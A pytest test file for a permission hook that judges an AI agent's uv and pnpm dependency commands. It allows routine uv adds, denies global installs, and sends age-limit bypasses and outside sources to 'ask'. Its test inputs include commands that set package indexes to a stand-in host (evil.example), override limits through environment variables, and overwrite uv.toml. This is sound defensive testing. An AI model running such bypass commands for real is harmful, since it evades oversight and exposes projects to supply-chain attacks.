"""uv dependency changes run inside the age limit; anything that could escape it or the project asks."""

import json
from pathlib import Path

import pytest
from tests.runtime import REPO_ROOT, load_script_module

guard = load_script_module("agents/hooks/guard_command.py", "guard_command")
POLICY = json.loads((REPO_ROOT / "agents/command_permissions.json").read_text())["rules"]


def judged(project: Path, command: str, kind: str) -> str:
    payload = {"cwd": str(project), "session_id": "s", "tool_name": "Bash", "tool_input": {"command": command}}
    return guard.decide(kind, payload).decision


def decisions(prefix: tuple[str, ...]) -> set[str]:
    return {rule["decision"] for rule in POLICY if tuple(rule["prefix"]) == prefix}


@pytest.mark.parametrize(
    "command",
    [
        "uv add httpx",
        "uv add httpx==0.27.0",
        'uv add "httpx>=0.27"',
        "uv add --group audit vulture",
        "uv lock --upgrade-package ruff",
        "uv lock --upgrade-package ruff==0.5.0",
        "uv add httpx && uv run --frozen pytest",
        "ls && uv add httpx",
        "uv add 'httpx[http2]>=0.27,<1'",
        "uv add --group audit vulture --no-sync",
        "uv lock --upgrade",
        "uv lock -P ruff",
        "uv add zope.interface",
        "uv add backports.zoneinfo==0.2.1",
    ],
)
def test_uv_dependency_changes_inside_the_age_limit_run(git_project: Path, command: str) -> None:
    assert judged(git_project, command, "forbidden") == "allow"
    assert judged(git_project, command, "allowed") == "allow"


@pytest.mark.parametrize(
    "prefix",
    [
        ("pnpm", "add"),
        ("cargo", "add"),
        ("cargo", "update"),
        ("go", "get"),
        ("go", "mod", "tidy"),
        ("nix", "flake", "update"),
    ],
)
def test_dependency_changes_no_age_limit_guards_ask(prefix: tuple[str, ...]) -> None:
    assert decisions(prefix) == {"ask"}


@pytest.mark.parametrize(
    "command",
    [
        "uv add httpx --exclude-newer 2099-01-01",
        "uv add httpx --exclude-newer=2099-01-01",
        "uv add httpx --exclude-newer-package httpx=2099-01-01",
        "uv lock --upgrade --no-config",
        "uv add httpx --project /other/repo",
        "uv add httpx --directory=/other/repo",
        "uv add --script /other/tool.py httpx",
        "uv lock --upgrade --config-file /other/uv.toml",
        "UV_EXCLUDE_NEWER=2099-01-01 uv add httpx",
        "env UV_NO_CONFIG=1 uv add httpx",
        "export UV_EXCLUDE_NEWER=2099-01-01 && uv add httpx",
        "UV_EXCLUDE_NEWER=2099-01-01; export UV_EXCLUDE_NEWER; uv add httpx",
        "set -a; UV_NO_CONFIG=1; uv add httpx",
        "source settings.sh && uv add httpx",
        "cd /other/repo && uv add httpx",
        "(cd ../sibling; uv add httpx)",
        "pushd /x && uv lock --upgrade",
        "python3 write_settings.py && uv add httpx",
        "nohup uv add httpx",
        "git status && uv add httpx",
        "git apply p.diff && uv add httpx",
        "git checkout other -- pyproject.toml && uv add httpx",
        "printf 'x' > uv.toml && uv add httpx",
        "cat relaxed.toml > uv.toml && uv add httpx",
        "cat > uv.toml <<'EOF'\n[tool.uv]\nEOF\nuv add httpx",
        "uv add httpx > uv.toml",
        "uv add git+https://github.com/someone/pkg",
        "uv add https://example.com/pkg-1.0.tar.gz",
        "uv add ./vendor/pkg",
        "uv add /opt/pkg",
        "uv add ../pkg.whl",
        "uv add 'pkg @ https://example.com/pkg.whl'",
        "uv add pkg --index https://evil.example/simple",
        "uv add pkg --index=https://evil.example/simple",
        "uv add pkg --default-index https://evil.example/simple",
        "uv add pkg --index-url https://evil.example/simple",
        "uv add pkg --extra-index-url https://evil.example/simple",
        "uv add pkg -f https://evil.example/links",
        "uv add pkg --find-links /tmp/links",
        "uv add --editable ./pkg",
        "uv add pkg --rev main",
        "uv add pkg --branch main",
        "uv add pkg --tag v1",
        "uv add -r /other/requirements.txt",
        "uv add --requirements=/other/requirements.txt",
        "uv add -c constraints.txt httpx",
        "uv add -ihttps://evil.example/simple httpx",
        "uv add -i https://evil.example/simple httpx",
        "uv add --frozen-but-unknown httpx",
        "uv add 'httpx; python_version > \"3\"'",
        "uv add pkg@https://example.com/pkg.whl",
        "uv add owner/repo",
        "uv add 'C:\\pkg'",
        "uv run python w.py && uv add httpx",
        "uv sync && uv add httpx",
        "printf -v HOME /tmp/empty && uv add httpx",
        "uv add evil-1.0.tar.gz",
        "uv add evil-1.0-py3-none-any.whl",
        "uv add evil.zip",
        "uv add evil-1.0.tar.bz2",
        "uv add evil.egg",
        "uv add evil-1.0.tar.lz",
        "uv add evil-1.0.tar.lzma",
        "uv add evil-1.0.tlz",
        "uv add evil-1.0.tar.zst",
        "uv add evil-1.0.tzst",
        "uv add 'evil-1.0.TAR.GZ'",
    ],
)
def test_a_uv_change_that_could_escape_the_limit_or_the_project_asks(git_project: Path, command: str) -> None:
    assert judged(git_project, command, "allowed") == "ask"


@pytest.mark.parametrize("name", ["pyproject.toml", "uv.toml"])
def test_a_project_that_sets_its_own_age_limit_asks(git_project: Path, name: str) -> None:
    (git_project / name).write_text('[tool.uv]\nexclude-newer = "2099-01-01T00:00:00Z"\n')
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


@pytest.mark.parametrize(
    "command",
    [
        "pnpm add -g cowsay",
        "pnpm add cowsay -g",
        "pnpm add cowsay -g=true",
        "pnpm add cowsay --global",
        "pnpm add cowsay --glob",
        "pnpm add cowsay --global=true",
        "pnpm add cowsay --config.global=true",
        "pnpm add -Dg cowsay",
        "pnpm add cowsay --global-dir /tmp/g",
        "pnpm add cowsay --config.global-dir=/tmp/g",
        "pnpm --global add cowsay",
        "uv add --dev pytest",
        "uv add pytest --dev",
    ],
)
def test_global_installs_and_the_legacy_dev_group_are_denied_wherever_the_flag_sits(
    git_project: Path, command: str
) -> None:
    assert judged(git_project, command, "forbidden") == "deny"


@pytest.mark.parametrize(
    "settings",
    [
        '[[tool.uv.index]]\nurl = "https://evil.example/simple"\n',
        '[tool.uv.sources]\npkg = { git = "https://github.com/someone/pkg" }\n',
        'index-url = "https://evil.example/simple"\n',
        '[tool.uv]\nindex = [{ url = "https://evil.example/simple" }]\n',
        '[tool.uv]\n"index-url" = "https://evil.example/simple"\n',
        '[tool]\nuv = { sources = { pkg = { path = "/opt/pkg" } } }\n',
        "[tool.uv\nbroken",
        '[tool.uv]\noverride-dependencies = ["pkg @ https://evil.example/pkg.whl"]\n',
        '[tool.uv]\nconstraint-dependencies = ["pkg<2"]\n',
        '[tool.uv]\ndev-dependencies = ["pkg"]\n',
        '[project]\nname = "x"\ndependencies = ["pkg @ git+https://github.com/someone/pkg"]\n',
        '[project.optional-dependencies]\nextra = ["pkg @ file:///opt/pkg"]\n',
        '[dependency-groups]\ndev = ["./vendor/pkg"]\n',
    ],
)
def test_a_project_that_adds_its_own_package_sources_asks(git_project: Path, settings: str) -> None:
    (git_project / "pyproject.toml").write_text(settings)
    assert judged(git_project, "uv add httpx", "allowed") == "ask"


def test_a_project_with_harmless_uv_settings_runs(git_project: Path) -> None:
    (git_project / "pyproject.toml").write_text('[project]\nname = "x"\n\n[tool.uv]\npackage = false\n')
    assert judged(git_project, "uv add httpx", "allowed") == "allow"


@pytest.mark.parametrize("command", ["uv lock --check", "uv lock --dry-run", "uv lock --locked", "uv lock"])
def test_uv_lock_without_an_upgrade_is_not_a_dependency_change(git_project: Path, command: str) -> None:
    (git_project / "pyproject.toml").write_text('[tool.uv]\nexclude-newer = "1 week"\n')
    assert judged(git_project, command, "allowed") == "allow"
